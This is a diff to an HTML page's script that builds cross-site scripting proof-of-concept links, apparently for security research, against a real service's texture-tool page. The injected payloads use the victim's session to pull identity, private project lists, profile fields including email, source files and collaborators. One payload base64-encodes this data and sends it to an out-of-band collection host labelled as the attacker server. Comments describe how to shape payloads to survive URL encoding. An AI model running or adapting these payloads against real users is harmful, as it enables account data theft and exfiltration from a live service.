@@ -83,80 +83,103 @@ pre{background:#1e1e1e;color:#d4d4d4;padding:14px;border-radius:6px;overflow-x:a
 </div>
 
 <script>
+// NOTE: Payloads must have ZERO spaces because browsers encode spaces to %20
+// in URL fragments. The %20 appears literally in window.location.href which
+// breaks JavaScript syntax. Use parentheses instead of spaces after return,
+// concatenation instead of comma-separated console.log args, etc.
+
 var B='https://playcanvas.com/texture-tool/#';
 var E=";void('";
 var O='https://playcanvas.com';
 
-// Test 1: Identity + project enumeration
+// Test 1: Identity + project enumeration (zero spaces)
 var p1=[
 "');",
-"var o='",O,"';",
-"fetch(o+'/api/id',{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(d){",
-  "console.log('=== XSS: USER IDENTITY ===');",
-  "console.log('ID:',d.id,'Username:',d.username,'Name:',d.full_name,'Plan:',d.plan_type);",
-  "fetch(o+'/api/users/'+d.id+'/projects',{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(p){",
-    "console.log('=== XSS: ALL PROJECTS (incl. private) ===');",
+"fetch('",O,"/api/id',{credentials:'same-origin'})",
+".then(function(r){return(r.json())})",
+".then(function(d){",
+  "console.log('===XSS_PROJECT_ENUM===');",
+  "console.log('ID:'+d.id);",
+  "console.log('Username:'+d.username);",
+  "console.log('Name:'+d.full_name);",
+  "console.log('Plan:'+d.plan_type);",
+  "fetch('",O,"/api/users/'+d.id+'/projects',{credentials:'same-origin'})",
+  ".then(function(r){return(r.json())})",
+  ".then(function(p){",
+    "console.log('===XSS_ALL_PROJECTS===');",
     "if(p.result){",
-      "console.log('Found',p.result.length,'projects:');",
-      "p.result.forEach(function(x,i){console.log('#'+(i+1),x.name,'(ID:'+x.id+', private:'+x.private+')')});",
-    "}else{console.log('Raw response:',JSON.stringify(p))}",
+      "console.log('Total:'+p.result.length);",
+      "p.result.forEach(function(x,i){",
+        "console.log('Project_'+(i+1)+':'+x.name+'|ID:'+x.id+'|private:'+x.private)",
+      "});",
+    "}else{console.log('Response:'+JSON.stringify(p))}",
   "})",
 "})"
 ].join('');
 document.getElementById('test1').href=B+p1+E;
 
-// Test 2: Full profile
+// Test 2: Full profile (zero spaces)
 var p2=[
 "');",
-"var o='",O,"';",
-"fetch(o+'/api/id',{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(d){",
-  "fetch(o+'/api/users/'+d.id,{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(u){",
-    "console.log('=== XSS: FULL USER PROFILE ===');",
-    "console.log('All fields:',JSON.stringify(u,null,2));",
-    "var keys=Object.keys(u);",
-    "console.log('Fields returned:',keys.join(', '));",
-    "if(u.email)console.log('EMAIL FOUND:',u.email);",
+"fetch('",O,"/api/id',{credentials:'same-origin'})",
+".then(function(r){return(r.json())})",
+".then(function(d){",
+  "fetch('",O,"/api/users/'+d.id,{credentials:'same-origin'})",
+  ".then(function(r){return(r.json())})",
+  ".then(function(u){",
+    "console.log('===XSS_FULL_PROFILE===');",
+    "console.log('AllFields:'+JSON.stringify(u));",
+    "console.log('FieldNames:'+Object.keys(u).join(','));",
+    "if(u.email)console.log('EMAIL:'+u.email);",
   "})",
 "})"
 ].join('');
 document.getElementById('test2').href=B+p2+E;
 
-// Test 3: Source code listing
+// Test 3: Source code listing (zero spaces)
 var p3=[
 "');",
-"var o='",O,"';",
-"fetch(o+'/api/id',{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(d){",
-  "fetch(o+'/api/users/'+d.id+'/projects',{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(p){",
-    "if(!p.result||!p.result.length){console.log('No projects found. Create a project first.');return}",
-    "var proj=p.result[0];",
-    "console.log('=== XSS: SOURCE CODE LISTING for',proj.name,'===');",
+"fetch('",O,"/api/id',{credentials:'same-origin'})",
+".then(function(r){return(r.json())})",
+".then(function(d){",
+  "fetch('",O,"/api/users/'+d.id+'/projects',{credentials:'same-origin'})",
+  ".then(function(r){return(r.json())})",
+  ".then(function(p){",
+    "if(!p.result||!p.result.length){console.log('No_projects_found');return}",
+    "console.log('===XSS_SOURCE_CODE===');",
+    "console.log('Project:'+p.result[0].name+'|ID:'+p.result[0].id);",
     "Promise.all([",
-      "fetch(o+'/api/projects/'+proj.id+'/repositories/directory/sourcefiles',{credentials:'same-origin'}).then(function(r){return r.json()}),",
-      "fetch(o+'/api/projects/'+proj.id+'/assets?branchId=main&limit=100',{credentials:'same-origin'}).then(function(r){return r.json()}),",
-      "fetch(o+'/api/projects/'+proj.id+'/collaborators',{credentials:'same-origin'}).then(function(r){return r.json()})",
+      "fetch('",O,"/api/projects/'+p.result[0].id+'/repositories/directory/sourcefiles',{credentials:'same-origin'}).then(function(r){return(r.json())}),",
+      "fetch('",O,"/api/projects/'+p.result[0].id+'/assets?branchId=main&limit=100',{credentials:'same-origin'}).then(function(r){return(r.json())}),",
+      "fetch('",O,"/api/projects/'+p.result[0].id+'/collaborators',{credentials:'same-origin'}).then(function(r){return(r.json())})",
     "]).then(function(a){",
-      "console.log('Source files:',JSON.stringify(a[0],null,2));",
-      "console.log('Assets:',JSON.stringify(a[1],null,2));",
-      "console.log('Collaborators:',JSON.stringify(a[2],null,2));",
+      "console.log('SourceFiles:'+JSON.stringify(a[0]));",
+      "console.log('Assets:'+JSON.stringify(a[1]));",
+      "console.log('Collaborators:'+JSON.stringify(a[2]));",
     "})",
   "})",
 "})"
 ].join('');
 document.getElementById('test3').href=B+p3+E;
 
-// Test 4: Exfiltration
+// Test 4: Exfiltration (zero spaces)
 var p4=[
 "');",
-"var o='",O,"';",
-"fetch(o+'/api/id',{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(d){",
-  "fetch(o+'/api/users/'+d.id,{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(u){",
-    "fetch(o+'/api/users/'+d.id+'/projects',{credentials:'same-origin'}).then(function(r){return r.json()}).then(function(p){",
-      "var data={identity:d,profile:u,projects:p};",
-      "var b=btoa(unescape(encodeURIComponent(JSON.stringify(data))));",
-      "console.log('=== XSS: EXFILTRATING ALL DATA ===');",
-      "console.log(JSON.stringify(data,null,2));",
-      "fetch('https://dajrmvhmmo1qfdkbit30gd6qrii54pgnb.oast.online/'+b.substring(0,2000),{mode:'no-cors'});",
-      "console.log('Data sent to attacker server');",
+"fetch('",O,"/api/id',{credentials:'same-origin'})",
+".then(function(r){return(r.json())})",
+".then(function(d){",
+  "fetch('",O,"/api/users/'+d.id,{credentials:'same-origin'})",
+  ".then(function(r){return(r.json())})",
+  ".then(function(u){",
+    "fetch('",O,"/api/users/'+d.id+'/projects',{credentials:'same-origin'})",
+    ".then(function(r){return(r.json())})",
+    ".then(function(p){",
+      "console.log('===XSS_EXFILTRATING===');",
+      "console.log('Identity:'+JSON.stringify(d));",
+      "console.log('Profile:'+JSON.stringify(u));",
+      "console.log('Projects:'+JSON.stringify(p));",
+      "fetch('https://dajrmvhmmo1qfdkbit30gd6qrii54pgnb.oast.online/'+btoa(unescape(encodeURIComponent(JSON.stringify({i:d,u:u,p:p})))).substring(0,2000),{mode:'no-cors'});",
+      "console.log('Sent_to_attacker');",
     "})",
   "})",
 "})"
